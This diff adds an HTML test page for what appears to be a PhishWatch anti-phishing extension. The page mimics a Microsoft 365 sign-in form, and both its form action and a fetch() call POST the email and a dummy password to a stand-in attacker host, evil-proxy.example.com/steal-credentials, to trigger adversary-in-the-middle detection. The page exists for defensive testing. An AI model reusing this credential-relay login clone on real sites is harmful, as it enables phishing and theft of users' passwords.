@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in — Microsoft 365</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', -apple-system, sans-serif;
+      background: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .login-container {
+      background: #fff;
+      width: 440px;
+      padding: 44px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+    .logo { font-size: 22px; font-weight: 600; color: #1a1a1a; margin-bottom: 24px; }
+    .logo span { color: #0078d4; }
+    h1 { font-size: 24px; font-weight: 300; color: #1b1b1b; margin-bottom: 24px; }
+    .field { margin-bottom: 16px; }
+    .field label { display: block; font-size: 14px; color: #1b1b1b; margin-bottom: 6px; }
+    .field input {
+      width: 100%; padding: 8px 10px; font-size: 15px;
+      border: 1px solid #8a8886; border-radius: 2px; outline: none; font-family: inherit;
+    }
+    .field input:focus { border-color: #0078d4; }
+    .submit-btn {
+      width: 100%; padding: 10px; background: #0078d4; color: #fff;
+      font-size: 15px; font-weight: 600; border: none; border-radius: 2px;
+      cursor: pointer; margin-top: 12px; font-family: inherit;
+    }
+    .submit-btn:hover { background: #106ebe; }
+    .info {
+      margin-top: 24px; padding: 16px; background: #fff4e5;
+      border-left: 3px solid #e8912d; font-size: 13px; color: #5a5a5a; line-height: 1.6;
+    }
+    .info strong { color: #1a1a1a; }
+    .info code { background: #f0f0f0; padding: 1px 5px; border-radius: 3px; font-size: 12px; }
+    .test-label {
+      position: fixed; top: 12px; right: 12px; background: #d13438; color: #fff;
+      font-size: 11px; font-weight: 600; padding: 6px 12px; border-radius: 4px;
+      font-family: 'Consolas', monospace; letter-spacing: 0.05em; z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="test-label">PHISHWATCH AiTM SIMULATION</div>
+
+  <div class="login-container">
+    <div class="logo">Microsoft<span> 365</span></div>
+    <h1>Sign in</h1>
+
+    <form id="login-form" action="https://evil-proxy.example.com/steal-credentials" method="POST">
+      <div class="field">
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email" value="user@company.com" readonly>
+      </div>
+      <div class="field">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="off">
+      </div>
+      <button type="submit" class="submit-btn">Sign in</button>
+    </form>
+
+    <div class="info">
+      <strong>PhishWatch AiTM Test:</strong> This simulates an Adversary-in-the-Middle proxy page.
+      The form <code>action</code> points to <code>evil-proxy.example.com</code> — a different origin than this page.<br><br>
+      <strong>How to test:</strong> Click the password field. Within ~2 seconds, PhishWatch should
+      detect the form action mismatch combined with cross-origin network activity and show
+      the "Credential Relay Attack Detected" overlay.<br><br>
+      <strong>What happens:</strong> When you click the password field, the simulation fires a
+      cross-origin POST (simulating the AiTM proxy's credential relay) during PhishWatch's
+      treadmill observation window. This triggers both detection conditions simultaneously.
+    </div>
+  </div>
+
+  <script>
+    // AiTM detection requires TWO conditions in the SAME treadmill window:
+    //   (A) formActionMismatch = true
+    //   (B) observedOrigins.length > 0 (cross-origin POST observed)
+    //
+    // When password field is focused:
+    //   1. onCredentialFieldFocus → armTreadmill (2000ms window)
+    //   2. detectFormActionMismatch → sets formActionMismatch = true
+    //
+    // 500ms later, we fire a cross-origin POST via fetch():
+    //   3. pw-net-hook.js intercepts → emits phishwatch_net_event
+    //   4. recordTreadmillEvent records it in observedOrigins
+    //
+    // When treadmill disarms at 2000ms:
+    //   5. analyzeAuthWindowSignals sees formActionMismatch=true + observedOrigins=[1]
+    //   6. → showBrowserNativeAttackWarning('AiTM') → overlay fires
+
+    var postFired = false;
+
+    document.getElementById('password').addEventListener('focus', function() {
+      if (postFired) return;
+      postFired = true;
+
+      console.log('[AiTM Sim] Password field focused — treadmill should arm now');
+      console.log('[AiTM Sim] Form action: https://evil-proxy.example.com/steal-credentials');
+      console.log('[AiTM Sim] Page origin: ' + window.location.origin);
+      console.log('[AiTM Sim] Firing cross-origin POST in 500ms...');
+
+      setTimeout(function() {
+        console.log('[AiTM Sim] Firing cross-origin POST to evil-proxy.example.com');
+        try {
+          fetch('https://evil-proxy.example.com/steal-credentials', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'email=user@company.com&password=simulated',
+            mode: 'no-cors'
+          }).catch(function() {
+            console.log('[AiTM Sim] POST network error (expected — domain does not exist)');
+          });
+        } catch(e) {
+          console.log('[AiTM Sim] fetch exception (expected):', e);
+        }
+        console.log('[AiTM Sim] Overlay should appear when treadmill disarms (~1.5s from now)');
+      }, 500);
+    });
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+    });
+  </script>
+</body>
+</html>
